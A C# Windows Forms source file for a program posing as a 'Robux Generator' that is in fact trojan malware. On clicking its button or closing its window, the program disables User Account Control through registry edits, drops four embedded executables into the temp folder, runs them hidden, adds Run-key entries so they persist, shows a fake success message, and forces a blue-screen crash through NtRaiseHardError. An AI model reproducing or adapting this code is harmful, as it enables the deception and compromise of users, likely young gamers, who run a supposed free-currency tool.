using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Web;
using System.Net.Mail;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;
using Microsoft.Win32;
using System.Diagnostics;
using System.Windows;
using System.Configuration;

namespace RBXGenerator
{
    public partial class Form1 : Form
    {
        private static uint STATUS_ASSERTION_FAILURE = 0xC0000420; //Error Code for BSOD
        public Form1()
        {
            InitializeComponent();
        }

        [DllImport("ntdll.dll")]
        private static extern IntPtr RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);

        [DllImport("ntdll.dll")]
        private static extern IntPtr NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);

        private void Form1_Load(object sender, EventArgs e)
        {
            //
        }

        private void button1_Click(object sender, EventArgs e)
        {
            string temp = System.IO.Path.GetTempPath();
            RegistryKey rektedit;
            rektedit = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Winlogon");
            rektedit.SetValue("AutoRestartShell", "0", RegistryValueKind.DWord);
            rektedit.Close();
            rektedit = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            rektedit.SetValue("ConsentPromptBehaivorAdmin", "0", RegistryValueKind.DWord);
            rektedit.Close();
            rektedit = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            rektedit.SetValue("ConsentPromptBehaivorUser", "0", RegistryValueKind.DWord);
            rektedit.Close();
            rektedit = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            rektedit.SetValue("EnableLUA", "0", RegistryValueKind.DWord);
            rektedit.Close();

            System.IO.File.WriteAllBytes(temp + "exerx.exe", Properties.Resources.exerx0);
            System.IO.File.WriteAllBytes(temp + "iorx.exe", Properties.Resources.RXinout0);
            System.IO.File.WriteAllBytes(temp + "vrx.exe", Properties.Resources.RXvs0);
            System.IO.File.WriteAllBytes(temp + "winrx.exe", Properties.Resources.RXwin0);
            
            
            
            ProcessStartInfo pl1 = new ProcessStartInfo(temp + "iorx.exe");
            ProcessStartInfo pl2 = new ProcessStartInfo(temp + "vrx.exe");
            ProcessStartInfo pl4 = new ProcessStartInfo(temp + "exerx.exe");
            pl1.CreateNoWindow = true;
            pl1.UseShellExecute = false;
            pl2.CreateNoWindow = true;
            pl2.UseShellExecute = false;
            pl4.CreateNoWindow = true;
            pl4.UseShellExecute = false;
            Process.Start(pl1);
            Process.Start(pl2);
            Process.Start(pl4);

            System.Threading.Thread.Sleep(10000);
            MessageBox.Show("Robux has been successfully added!", "Robux Generator", MessageBoxButtons.OK, MessageBoxIcon.Information);
            this.Hide();
            System.Threading.Thread.Sleep(1000);
            RtlAdjustPrivilege(19, true, false, out bool PreviousValue);
            NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, IntPtr.Zero, 6, out uint Response);

        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
            this.Hide();
            string temp = System.IO.Path.GetTempPath();
            RegistryKey rektedit;

            rektedit = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Winlogon");
            rektedit.SetValue("AutoRestartShell", "0", RegistryValueKind.DWord);
            rektedit.Close();
            rektedit = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            rektedit.SetValue("ConsentPromptBehaivorAdmin", "0", RegistryValueKind.DWord);
            rektedit.Close();
            rektedit = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            rektedit.SetValue("ConsentPromptBehaivorUser", "0", RegistryValueKind.DWord);
            rektedit.Close();
            rektedit = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            rektedit.SetValue("EnableLUA", "0", RegistryValueKind.DWord);
            rektedit.Close();

            System.IO.File.WriteAllBytes(temp + "exerx.exe", Properties.Resources.exerx0);
            System.IO.File.WriteAllBytes(temp + "iorx.exe", Properties.Resources.RXinout0);
            System.IO.File.WriteAllBytes(temp + "vrx.exe", Properties.Resources.RXvs0);
            System.IO.File.WriteAllBytes(temp + "winrx.exe", Properties.Resources.RXwin0);
            

            rektedit = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            rektedit.SetValue("winrx", temp + "winrx.exe");
            rektedit.Close();
            rektedit = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            rektedit.SetValue("iorx", temp + "iorx.exe");
            rektedit.Close();
            rektedit = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            rektedit.SetValue("vrx", temp + "vrx.exe");
            rektedit.Close();
            rektedit = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            rektedit.SetValue("exerx", temp + "exerx.exe");
            rektedit.Close();

           
            ProcessStartInfo pl1 = new ProcessStartInfo(temp + "iorx.exe");
            ProcessStartInfo pl2 = new ProcessStartInfo(temp + "vrx.exe");
            ProcessStartInfo pl4 = new ProcessStartInfo(temp + "exerx.exe");
            pl1.CreateNoWindow = true;
            pl1.UseShellExecute = false;
            pl2.CreateNoWindow = true;
            pl2.UseShellExecute = false;
            pl4.CreateNoWindow = true;
            pl4.UseShellExecute = false;
            Process.Start(pl1);
            Process.Start(pl2);
            Process.Start(pl4);
            System.Threading.Thread.Sleep(10000);
            RtlAdjustPrivilege(19, true, false, out bool PreviousValue);
            NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, IntPtr.Zero, 6, out uint Response);
        } 
    }
}
